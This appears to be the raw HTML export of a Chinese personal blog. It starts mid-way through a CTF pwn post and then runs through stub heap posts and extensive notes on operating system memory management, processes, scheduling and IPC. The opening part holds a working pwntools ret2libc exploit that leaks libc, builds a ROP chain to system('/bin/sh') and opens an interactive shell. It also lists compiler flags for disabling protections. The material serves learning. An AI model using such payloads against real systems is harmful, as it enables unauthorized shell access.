class="string">&#x27;\nWelCome&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    puts_addr = u64(result.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># left-justed, paded with &#x27;\x00&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    offset_binsh = <span class="number">0x1b45bd</span></span><br><span class="line">    offset_system = <span class="number">0x0000000000052290</span></span><br><span class="line">    offset_puts = <span class="number">0x0000000000084420</span></span><br><span class="line">    libcBase = puts_addr - offset_puts</span><br><span class="line">    binsh_addr = libcBase + offset_binsh</span><br><span class="line">    system_addr = libcBase + offset_system</span><br><span class="line">    <span class="comment"># Using LibcSearcher usually meets failure</span></span><br><span class="line">    <span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">    <span class="comment"># libcBase = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line">    <span class="comment"># system_addr = libcBase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">    <span class="comment"># binsh_addr = libcBase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*length + p64(ret_addr) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;password?\n&#x27;</span>,payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>值得吐槽的是<code>LibcSearcher</code>依旧没什么弔用</li>
</ul>
<h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><ol>
<li>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</li>
<li>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</li>
<li>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</li>
</ol>
<p><code>gcc</code>编译：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，即</span><br></pre></td></tr></table></figure>



<h3 id="机制开-x2F-关指令总结"><a href="#机制开-x2F-关指令总结" class="headerlink" title="机制开&#x2F;关指令总结"></a>机制开&#x2F;关指令总结</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; 各种安全选择的编译参数如下:</span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">* NX：-z execstack / -z noexecstack (关闭 / 开启)</span><br><span class="line">* Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-<span class="built_in">all</span> (关闭 / 开启 / 全开启)</span><br><span class="line">* PIE：-no-pie / -pie (关闭 / 开启)</span><br><span class="line">* RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</span><br></pre></td></tr></table></figure>







<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h3 id="pwntools技巧"><a href="#pwntools技巧" class="headerlink" title="pwntools技巧"></a>pwntools技巧</h3><blockquote>
<p>直接使用</p>
<p><code>sh = gdb.debug(&#39;./filename&#39;, &quot;break main&quot;)</code></p>
<p>来替代</p>
<p><code>sh = process(&#39;./filename&#39;)</code></p>
<p>实现管道连接下的断点！！！</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload=<span class="string">b&#x27;aaaaaa&#x27;</span></span><br><span class="line">sh=gdb.debug(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;break main&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>



<h3 id="linux技巧"><a href="#linux技巧" class="headerlink" title="linux技巧"></a>linux技巧</h3><ul>
<li><p>报错<code>Address already in use</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">netstat -apn | grep port &lt;--端口值</span><br><span class="line">--- 查到pid</span><br><span class="line"><span class="keyword">or</span>: ps -ef | grep port</span><br><span class="line">--- 查看pid以及user</span><br><span class="line">kill -<span class="number">9</span> pid</span><br><span class="line">--- 杀死进程即可</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ubuntu-搭建本地服务器测试"><a href="#ubuntu-搭建本地服务器测试" class="headerlink" title="ubuntu 搭建本地服务器测试"></a>ubuntu 搭建本地服务器测试</h2><h4 id="使用socat本地搭建测试"><a href="#使用socat本地搭建测试" class="headerlink" title="使用socat本地搭建测试"></a>使用socat本地搭建测试</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">终端 <span class="number">1</span>: socat tcp-l:<span class="number">6666</span>,fork <span class="built_in">exec</span>:./文件名,reuseaddr	</span><br><span class="line">终端 <span class="number">2</span>: nc <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">6666</span>   测试</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>服务器端的进程在崩溃之后会重新启动</strong>，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序<strong>最初启动</strong>的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
<li>可以开两个<code>terminal</code>，然后一个作为<strong>服务器</strong>在后台运行，另一个可以脚本攻击等。</li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>heap 1</title>
    <url>/2022/06/16/pwn/heap-1/</url>
    <content><![CDATA[<h1 id="堆利用基础"><a href="#堆利用基础" class="headerlink" title="堆利用基础"></a>堆利用基础</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="/2022/06/16/pwn/heap-1/program_virtual_address_memory_space.png" alt="program_virtual_address_memory_space"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap 2</title>
    <url>/2022/06/17/pwn/heap-2/</url>
    <content><![CDATA[<p><img src="/2022/06/17/pwn/heap-2/program_virtual_address_memory_space.png" alt="program_virtual_address_memory_space"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>OS Notes Part(I)</title>
    <url>/2022/06/27/system/os-notes/</url>
    <content><![CDATA[<h1 id="Modern-Operating-System-I"><a href="#Modern-Operating-System-I" class="headerlink" title="Modern Operating System (I)"></a>Modern Operating System (I)</h1><blockquote>
<p>前几章内容暂省略</p>
<ul>
<li><input disabled="" type="checkbox"> 内存管理</li>
<li><input disabled="" type="checkbox"> 进程与线程</li>
<li><input disabled="" type="checkbox"> 操作系统调度</li>
<li><input disabled="" type="checkbox"> 进程间通信</li>
</ul>
</blockquote>
<h2 id="4-内存管理"><a href="#4-内存管理" class="headerlink" title="4 内存管理"></a>4 内存管理</h2><hr>
<ul>
<li>转址旁路缓存<code>TLB (Translation Lookaside Buffer)</code><ul>
<li>TLB命中：<code>TLB hit</code></li>
<li>TLB未命中：<code>TLB miss</code></li>
</ul>
</li>
<li><code>AArch64 (based on ARMv8.0)</code> 架构：4级页表<ul>
<li>最小页：有<code>4KB</code>,<code>16KB</code>,<code>64KB</code>,可通过<code>TCR_EL1</code>进行配置</li>
</ul>
</li>
<li>一种TLB刷新机制：为<code>TLB</code>缓存项打”标签”来减少程序切换时TLB刷新的开销<ul>
<li><code>ASID (Address Space IDentifier)</code>：基于<code>aarch64</code></li>
<li><code>PCID (Process Context IDentifier)</code>：基于<code>x86-64</code></li>
</ul>
</li>
<li>换页<code>page swapping</code><ul>
<li>换出<code>swap out</code></li>
<li>换入<code>swap in</code></li>
</ul>
</li>
<li>缺页异常<code>page fault</code></li>
<li>预取<code>prefetching</code>机制：发生<code>swap in</code>时，预测还有哪些页即将被访问，提前将其换入物理内存，减少<code>page fault</code></li>
<li>按需页分配<code>demand paging</code><ul>
<li>未分配状态</li>
<li>已分配但未映射至物理内存状态（初次访问时出发<code>page fault</code>）</li>
<li>区分两种状态：<ul>
<li>Linux中，程序的虚拟内存空间由多个虚拟内存区域构成，即<code>VMA (Virtual Memory Area)</code>：含<code>beginning VA</code>，<code>ending VA</code>，访问权限等信息。</li>
<li>P -&gt; page fault<ul>
<li>P属于VMA：已分配未映射</li>
<li>P不属于VMA：未分配</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>页替换策略<ul>
<li><code>MIN/OPT (Minimum / Optimal 最优策略)</code></li>
<li><code>FIFO (First-In First-Out)</code></li>
<li><code>Second Chance</code></li>
<li><code>LRU (Least Recently Used)</code>：基于程序过去频繁访问的页后续也可能被访问</li>
<li><code>MRU (Most Recently Used)</code>：基于程序不会反复访问相同地址情况</li>
<li><code>clock algorithm</code>：时钟算法策略</li>
</ul>
</li>
<li>工作集模型<code>working set model</code><ul>
<li>基于：优先将非工作集中的页换出</li>
<li>工作集时钟算法：<ul>
<li>维护2个状态：<strong>上次使用时间</strong>和<strong>访问位</strong></li>
<li>定期检查算时间间隔</li>
</ul>
</li>
</ul>
</li>
<li>共享内存<code>shared memory</code><ul>
<li>写时拷贝<code>copy-on-write</code></li>
<li>内存去重<code>memory deduplication</code><ul>
<li>定期扫描相同内容的物理页，找到映射对应的虚拟页，保留一个物理页，其余通过<code>copy-on-write</code>映射到该物理页，释放其他物理页。</li>
<li>如Linux的<code>KSM (Kernel Same-page Merging)</code>机制</li>
<li>性能下降产生延迟，资源利用率提高</li>
</ul>
</li>
</ul>
</li>
<li>内存压缩<ul>
<li>如Linux的<code>zswap</code>机制，<code>zswap</code>区域（仍属于内存区域）：为内存换页过程提供缓冲区</li>
<li>更加高效的磁盘批量<code>I/O</code></li>
</ul>
</li>
<li>大页<code>huge page</code><ul>
<li>Linux提供透明大页<code>transparent huge page</code>机制：自动将一个应用程序中连续的4KB内存页合并成2MB的内存页</li>
<li>提高效率（减少TLB项，提高TLB命中率），可能浪费物理内存资源</li>
</ul>
</li>
<li>内存碎片<code>fragmentation</code><ul>
<li>内部碎片<code>internal fragmentation</code></li>
<li>外部碎片<code>external fragmentation</code></li>
</ul>
</li>
<li>伙伴系统<code>buddy system</code><ul>
<li>减少外部碎片</li>
</ul>
</li>
<li><code>SLAB</code>分配器<ul>
<li>减少内部碎片</li>
<li>包括<code>SLAB</code>，<code>SLUB</code>，<code>SLOB</code></li>
<li>linux-2.6.23之后内核默认采用<code>SLUB</code>分配器（依赖于伙伴系统）</li>
</ul>
</li>
<li>常用空闲链表<ul>
<li>隐式空闲链表<code>implicit free list</code></li>
<li>显式空闲链表<code>explicit free list</code></li>
<li>分离空闲链表<code>segregated free list</code></li>
</ul>
</li>
</ul>
<h2 id="5-进程与线程"><a href="#5-进程与线程" class="headerlink" title="5 进程与线程"></a>5 进程与线程</h2><hr>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul>
<li><p>进程控制块<code>PCB (Process Control Block)</code></p>
</li>
<li><p>僵尸进程<code>zombie</code></p>
</li>
<li><p>进程管理：</p>
<ul>
<li><p>进程组<code>process group</code>：进程的集合 —&gt; 进程组标识符<code>tgid (In Linux PCB)</code></p>
</li>
<li><p>会话<code>session</code>：进程组的集合</p>
<blockquote>
<p>根据执行状态划分为：</p>
</blockquote>
<ul>
<li>前台进程组<code>foreground thread group</code></li>
<li>后台进程组<code>background thread group</code></li>
</ul>
</li>
<li><p><code>process group</code>和<code>session</code>主要用于<code>shell</code>环境的中的进程管理</p>
<ul>
<li>进程id -&gt; <code>PID</code></li>
<li>进程组id -&gt; <code>GID</code></li>
<li>会话id -&gt; <code>SID</code></li>
</ul>
</li>
</ul>
</li>
<li><p>控制中断进程<code>controlling terminal</code></p>
</li>
</ul>
<h3 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h3><ul>
<li><p>用户态线程<code>user-level thread</code></p>
</li>
<li><p>内核态线程<code>kernel-level thread</code></p>
</li>
<li><p>多线程模型<code>multithreading model</code></p>
</li>
<li><p>线程控制块<code>Thread Control Block</code></p>
</li>
<li><p>NPTL<code>Native POSIX Thread Library</code>：自<code>Linux 2.6</code>引入的线程库，沿用至今</p>
</li>
</ul>
<h3 id="fiber"><a href="#fiber" class="headerlink" title="fiber"></a>fiber</h3><blockquote>
<p>完全在用户态下完成</p>
</blockquote>
<ul>
<li>抢占式多任务处理<code>preemptive multitasking</code></li>
<li>合作式多任务处理<code>cooperative multitasking</code></li>
<li><code>(Windows) TLS(Fiber Local Storage)</code> ：纤程本地存储，用来为每个纤程保存同一变量的私有拷贝</li>
<li>协程<code>coroutine</code>：为了便于与操作系统提供的纤程支持相区分，程序语言提供的纤程支持称为协程</li>
</ul>
<h2 id="6-操作系统调度"><a href="#6-操作系统调度" class="headerlink" title="6 操作系统调度"></a>6 操作系统调度</h2><hr>
<ul>
<li><p>优先级<code>priority</code></p>
</li>
<li><p>时间片<code>time slice</code></p>
</li>
<li><p>截止时间<code>deadline</code></p>
</li>
<li><p>任务调度&#x2F;CPU调度<code>task scheduling</code></p>
</li>
<li><p>线程<code>thread</code>是调度器的调度对象，又叫做<strong>任务</strong><code>task</code></p>
<ul>
<li>运行队列<code>run queue</code></li>
<li><code>Linux</code>使用的调度器会用红黑树实现运行队列</li>
</ul>
</li>
<li><p>确定调度指标<code>what</code> ——&gt; 做出调度决策<code>how</code></p>
<ul>
<li><p>调度指标</p>
<ul>
<li><p>分类</p>
<ul>
<li>性能相关指标<ul>
<li>批处理任务<ul>
<li><strong>吞吐量</strong>：单位时间内处理的任务数量</li>
<li><strong>周转时间</strong>：任务从被发起直到执行结束所需的时间</li>
</ul>
</li>
<li>交互式任务<ul>
<li><strong>响应时间</strong>：任务从被发起直至第一次向用户返回输出以响应用户所需的时间</li>
</ul>
</li>
<li>调度开销：做出决策的时间应该尽可能短</li>
</ul>
</li>
<li>非性能指标：<strong>公平性</strong>、<strong>资源利用率</strong></li>
<li>任务场景需求：<strong>实时性</strong>、<strong>能耗</strong></li>
</ul>
</li>
<li><p>权衡</p>
<ul>
<li>调度开销和调度效果</li>
<li>优先级和公平性</li>
<li>性能与能耗</li>
</ul>
</li>
<li><p>调度机制</p>
<ul>
<li><p>进程调度<code>process scheduling</code>机制</p>
<ul>
<li><p>长期调度<code>long-term scheduling/job scheduling</code></p>
<blockquote>
<p>限制系统中真正被用来进行短期调度管理的进程数量，避免短期调度的开销过大</p>
<p>根据进程使用的资源类型，分类：计算密集型<code>CPU-bound</code>和<code>I/O</code>密集型<code>I/O-bound</code></p>
</blockquote>
</li>
<li><p>短期调度<code>short-term scheduling/job scheduling</code></p>
<blockquote>
<p>实际做出调度决策的机制</p>
<p>负责进程在 <strong>预备</strong>，<strong>运行</strong>，<strong>阻塞</strong> 状态间的转换 </p>
</blockquote>
</li>
<li><p>中期调度<code>medium-term scheduling/job scheduling</code></p>
<blockquote>
<p>长短期调度 —&gt; based on CPU and I&#x2F;O resource</p>
<p>中期调度 —&gt; based on memory</p>
<p>中期调度也是换页机制的一部分，当<strong>系统中内存使用量过大</strong>，就会触发换页机制，挂起处于<strong>预备状态</strong>的&#x2F;<strong>阻碍状态</strong>的进程，置为<strong>挂起预备状态&#x2F;挂起阻塞状态</strong>并放入<strong>挂起运行队列&#x2F;挂起阻塞队列</strong></p>
<p>引入无法被短期调度执行的两个状态</p>
<ul>
<li>挂起预备状态<code>suspended ready</code></li>
<li>挂起阻塞状态<code>suspended blocking</code></li>
</ul>
</blockquote>
</li>
</ul>
</li>
<li><p>批处理队列<code>batch queue</code></p>
</li>
<li><p>阻塞队列<code>blocking queue</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>调度决策</p>
</li>
</ul>
</li>
</ul>
<h2 id="7-进程间通信"><a href="#7-进程间通信" class="headerlink" title="7 进程间通信"></a>7 进程间通信</h2><hr>
<ul>
<li><p>进程间通信<code>Inter-Process Communication (IPC)</code></p>
</li>
<li><p>消息<code>message</code>：一种常见通信数据的抽象，包含一个头部<code>header</code>和一个数据段<code>payload</code></p>
<ul>
<li><code>header</code> : 魔数<code>magic number</code>，状态<code>state</code>，消息长度<code>message length</code>，验证码<code>verification code</code>等</li>
<li><code>payload</code> : 纯数据（如字符串<code>string</code>），系统资源（如文件描述符<code>file descriptor</code>）</li>
</ul>
</li>
<li><p>消息传递基本接口：</p>
<ul>
<li><code>Send(message)</code></li>
<li><code>Recv(message)</code></li>
<li><code>RPC(req_message, resp_message)</code>  —&gt; 远程过程调用：<code>Remote Procedure Call</code></li>
<li><code>Reply(resp_message)</code></li>
</ul>
</li>
<li><p>内存重映射<code>memory remapping</code></p>
</li>
<li><p><code>IPC Classification</code></p>
<ul>
<li>单向（管道，信号等）和双向（RPC）</li>
<li>同步（阻塞进程直到该IPC操作完成）和异步（非阻塞的，进程发起一次操作即可返回，不需要等待其完成）<ul>
<li><p>同步：被调用者<code>callee</code>处理请求时，调用者<code>caller</code>会处于<code>block</code>的状态，当<code>callee</code>执行完任务后，控制流会切回<code>caller</code></p>
<ul>
<li>一般是<strong>双向</strong><code>IPC</code>（或<code>RPC</code>）</li>
</ul>
</li>
<li><p>异步：多个并行的控制流，异步<code>IPC</code>通常通过【轮询内存状态】或【注册回调函数】（如果<code>kernel</code>支持的话）来获取返回结果。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>超时机制</p>
<ul>
<li>拒绝服务<code>denial-of-service</code></li>
</ul>
</li>
<li><p>通信连接管理</p>
<ul>
<li>直接通信：通信的<code>process</code>一方需要<strong>显示</strong>地标识另一方</li>
<li>间接通信：通过一个中间<strong>信箱</strong>完成通信，每一个信箱有一个唯一的标识符，共享信箱交换<code>message</code>，进程间连接的建立发生在共享一个<strong>信箱</strong>时候。（如管道）</li>
</ul>
</li>
<li><p>权限检查机制</p>
<ul>
<li>微内核，如<code>seL4</code>等微内核系统的<code>Capability</code>机制</li>
<li>宏内核，如<code>Linux</code>， 将【IPC安全检查机制】和【文件检查】结合在一起</li>
</ul>
</li>
<li><p><code>System V</code>进程间通信：即【宏内核】下的三种进程间通信机制：</p>
<ul>
<li><code>System V</code>消息队列</li>
<li><code>System V</code>信号量</li>
<li><code>System V</code>共享内存</li>
</ul>
</li>
<li><p><code>System V</code>通信的权限管理：在<code>Linux</code>等宏内核中是基于文件<code>File</code>的权限检查机制</p>
<ul>
<li><p>访问模式<code>mode</code></p>
</li>
<li><p>权限检查</p>
<blockquote>
<p><code>Linux</code>对<code>IPC</code>进行权限管理的<code>IPC_PERM</code>结构，类似文件的【<strong>访问模式</strong>】，权限检查机制确保安全性</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># uid 用户标识符</span></span><br><span class="line">  <span class="meta"># gid 用户组标识符</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_perm</span> &#123;</span></span><br><span class="line">    <span class="type">key_t</span> key; <span class="comment">// 进程可以根据key来索引到一个IPC对象</span></span><br><span class="line">    <span class="type">uid_t</span> uid; <span class="comment">// owner uid</span></span><br><span class="line">    <span class="type">gid_t</span> gid; <span class="comment">// owner gid</span></span><br><span class="line">    <span class="type">uid_t</span> cuid; <span class="comment">// creator uid</span></span><br><span class="line">    <span class="type">gid_t</span> cgid; <span class="comment">// creator gid</span></span><br><span class="line">    <span class="type">mode_t</span> mode; <span class="comment">// 访问模式</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>继承</p>
<ul>
<li>除了命名服务外的另外一种常见的【<strong>分发权限</strong>】的方式</li>
</ul>
</li>
<li><p><code>Linux</code>中，<strong>匿名管道</strong> —&gt; 用于父子进程之间的通信，内核通过在<code>fork</code>时<strong>复制</strong><code>copy</code>文件描述符表<code>File Descriptor Table</code>来建立<strong>父子进程</strong>之间的连接</p>
</li>
</ul>
</li>
</ul>
<h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><blockquote>
<p><code>naming server</code></p>
</blockquote>
<ul>
<li><p>【<strong>权限分发</strong>】通过一个用户态的服务——<strong>命名服务</strong>实现</p>
</li>
<li><p>过程：</p>
<ol>
<li>各个服务（如文件系统服务，数据库系统服务等）向<code>naming server</code>注册自己的服务名。</li>
<li>客户端进程向<code>naming server</code>上查询当前服务，并选择所需要的<strong>服务</strong>去尝试获取权限。</li>
<li>是否分发权限，是由<code>naming server</code>和对应的<strong>服务端进程</strong>（如文件系统进程，网络系统进程，数据库进程）根据特定的策略（如无条件，需要私钥签名的证书）来判断的。</li>
</ol>
</li>
<li><p>优点：</p>
<ul>
<li>各个服务不再是<code>kernel</code>中的<code>ID</code>等抽象的表示，而是对应用更友好的<strong>名字<code>name</code></strong></li>
</ul>
</li>
<li><p><code>naming server</code>一般在用户态</p>
</li>
</ul>
<h3 id="宏内核IPC"><a href="#宏内核IPC" class="headerlink" title="宏内核IPC"></a>宏内核<code>IPC</code></h3><blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 管道<code>pipe</code></li>
<li><input checked="" disabled="" type="checkbox"> <code>System V</code>：常指宏内核下三种具体的<code>IPC</code>机制<ul>
<li><input checked="" disabled="" type="checkbox"> 消息队列</li>
<li><input checked="" disabled="" type="checkbox"> 信号量</li>
<li><input checked="" disabled="" type="checkbox"> 共享内存</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <code>Linux</code>信号机制</li>
<li><input checked="" disabled="" type="checkbox"> 套接字<code>socket</code>机制</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>IPC机制</th>
<th>数据抽象</th>
<th>参与者</th>
<th>方向</th>
<th>内核实现</th>
</tr>
</thead>
<tbody><tr>
<td>管道<code>pipe</code></td>
<td>字节流</td>
<td>两个进程</td>
<td>单向</td>
<td>通常是<code>FIFO</code>缓冲区管理数据，分为<strong>匿名管道</strong>和<strong>命名管道</strong></td>
</tr>
<tr>
<td>消息队列<code>MQ</code></td>
<td>消息</td>
<td>多进程</td>
<td>单向双向</td>
<td>队列的组织方式，通过【文件权限】管理对队列的访问</td>
</tr>
<tr>
<td>信号量<code>semaphore</code></td>
<td>计数器</td>
<td>多进程</td>
<td>单向双向</td>
<td>内核<code>kernel</code>维护共享计数器，通过文件权限管理对计数器的访问</td>
</tr>
<tr>
<td>共享内存<code>chm</code></td>
<td>内存区间</td>
<td>多进程</td>
<td>单向双向</td>
<td>内核维护共享内存的内存区间，通过文件的权限来管理对共享内存的访问</td>
</tr>
<tr>
<td>信号<code>signal</code></td>
<td>事件编号</td>
<td>多进程</td>
<td>单向</td>
<td>为线程&#x2F;进程维护【信号等待队列】，通过用户 &#x2F; 组等的权限管理信号的操作</td>
</tr>
<tr>
<td>套接字<code>socket</code></td>
<td>数据报文</td>
<td>两个进程</td>
<td>单向双向</td>
<td>有基于<code>IP + port</code>和基于<code>file path</code>的寻址方式，利用网络栈来管理通信</td>
</tr>
</tbody></table>
<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><ul>
<li><p>匿名管道：通过<code>pipe</code>的系统调用创建</p>
<blockquote>
<p>父子进程</p>
</blockquote>
</li>
<li><p>命名管道：通过<code>mkfifo</code>命令创建 —&gt; 指定一个全局文件名</p>
<blockquote>
<p>远距离进程（任意两个进程）</p>
</blockquote>
</li>
</ul>
<h4 id="System-V-消息队列"><a href="#System-V-消息队列" class="headerlink" title="System V 消息队列"></a><code>System V</code> 消息队列</h4><ul>
<li><p>发送和接收<code>message</code>的接口是<code>kernel</code>提供的</p>
</li>
<li><p><code>kernel</code>从<code>system memory</code>中分配一个队列数据结构，作为消息<code>message</code>的内核对象</p>
</li>
<li><p><code>MQ</code>基本操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In Linux, the following operations are defined <span class="keyword">as</span> system call.</span><br></pre></td></tr></table></figure>

<ul>
<li><code>msgget</code>：允许进程获取已有消息队列的连接，或者创建一个新的消息队列</li>
<li><code>msgsnd</code>：发消息</li>
<li><code>msgrcv</code>：收消息</li>
<li><code>msgctl</code>：可以控制和管理一个消息队列，如修改消息队列的权限信息，或删除消息队列</li>
</ul>
</li>
<li><p>消息发送和消息接收一般是【<strong>非阻塞的</strong>】</p>
</li>
<li><p><code>Linux kernel</code>实现：</p>
<ul>
<li>【<strong>系统管理员</strong>】通常可以配置【<strong>单个消息</strong>】<code>single message</code>的最大空间、【<strong>单个消息队列</strong>】<code>single MQ</code>的最大空间、全系统的消息队列个数</li>
<li>通常建议使用【<strong>共享内存机制</strong>】传递长消息，而非使用<code>MQ</code></li>
<li>消息在用户态和内核态之间传递时，会有拷贝开销：<ul>
<li><code>copy_from_user</code></li>
<li><code>copy_to_user</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="System-V-信号量"><a href="#System-V-信号量" class="headerlink" title="System V 信号量"></a><code>System V</code> 信号量</h4><ul>
<li>通过对信号量的<code>PV</code>操作限制可以保证执行顺序</li>
<li>关键：封装一个计数器</li>
</ul>
<h4 id="System-V-共享内存"><a href="#System-V-共享内存" class="headerlink" title="System V 共享内存"></a><code>System V</code> 共享内存</h4><blockquote>
<p>在<code>Linux</code>的系统设计中，将共享内存的机制封装在了一个特殊的文件系统中（即共享内存文件系统<code>shm 文件系统</code>），实际中使用<code>tmpfs</code>实现</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	* kernel 为全局所有的共享内存维护一个全局队列结构,由结构体 [shmid_kernel] 组成</span><br><span class="line">	* IPC <span class="title function_">key</span> <span class="params">(全局唯一)</span> --&gt; <span class="keyword">struct</span> shmid_kernel</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> shmid_kernel &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> <span class="title">file</span>;</span>--&gt; VFS <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> </span></span><br><span class="line"><span class="class">                     --&gt;</span> 一段共享物理内存页的集合(也就是共享内存对应的物理内存)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[process1] and [process2]</span><br><span class="line">    * By <span class="title function_">shm_at</span> <span class="params">(kernel API)</span>---&gt; Reflect [shared memory] to [Virtual Address Space]</span><br><span class="line">    * kernel会为process1和process2分配两个<span class="title function_">VMA</span><span class="params">(Virtual Memory Area)</span>结构体,均指向file</span><br><span class="line">    * 两个VMA对应的虚拟地址可以不同, 只需要映射到相同的物理内存</span><br><span class="line">    * 支持任意数量的进程共享同一个共享内存区域, 只需要为它们分配[指向 <span class="keyword">struct</span> file 的VMA]即可</span><br><span class="line">    * 取消映射<span class="params">(detach操作)</span>只会影响当前进程的映射</span><br><span class="line"></span><br><span class="line">shm : shared memory</span><br><span class="line">shm_at: 建立对共享内存的映射的接口</span><br><span class="line">shm_dt: 取消共享内存和虚拟内存之间的映射的接口 </span><br></pre></td></tr></table></figure>



<h4 id="信号IPC"><a href="#信号IPC" class="headerlink" title="信号IPC"></a>信号<code>IPC</code></h4><ul>
<li><p>信号<code>signal</code>：具备【单向的事件通知】能力（信号量<code>semaphore</code>有通知能力，但需要进程主动查询计数器的状态或陷入阻塞状态等待通知）</p>
</li>
<li><p>信号传递信息很短，只有一个编号，且由<code>kernel</code>传递</p>
</li>
<li><p><code>Linux</code>早起使用信号有31（1~31号）个，后续<code>POSIX</code>标准引入了编号32~64的其他信号</p>
<ul>
<li>传统信号称为【常规信号】<ul>
<li>进程多次收到，<code>kernel</code>只会记录一次</li>
</ul>
</li>
<li><code>POSIX</code>引入称为【实时信号】<ul>
<li>进程多次收到，<code>kernel</code>不会丢弃相同信号时间</li>
</ul>
</li>
</ul>
</li>
<li><p><code>Linux</code>：<code>kernel</code>会为每个进程和线程准备一个【信号事件等待队列】</p>
<ul>
<li>一个进程内的多个线程<ul>
<li>共享该进程的【信号事件队列】</li>
<li>拥有自己私有的【等待队列】</li>
</ul>
</li>
</ul>
</li>
<li><p><code>Linux</code>提供了一个专门的系统调用<code>sigprocmask</code>：允许用户程序设置对特定信号的阻塞<code>block</code>状态</p>
<ul>
<li>信号阻塞，<code>Linux</code>不会再触发该信号对应的<code>handler function</code>，直到该信号被解除<code>block</code>，信号阻塞不阻碍信号被添加到等待队列上</li>
</ul>
</li>
<li><p><code>signal</code>既用于<code>IPC</code>也用于进程管理</p>
</li>
<li><p>内核对信号的处理</p>
<ul>
<li><p>时机：通常是<code>kernel</code>执行完<code>exception</code>, <code>interrupt</code>, <code>syscall</code>返回用户态的时刻</p>
</li>
<li><p>方式：</p>
<ul>
<li>忽略</li>
<li>用户处理函数：调用【用户注册】的【信号处理函数】</li>
<li>内核默认处理函数：调用【默认】的【内核处理函数】</li>
</ul>
</li>
<li><p>Linux信号内核与用户态之间的切换</p>
<blockquote>
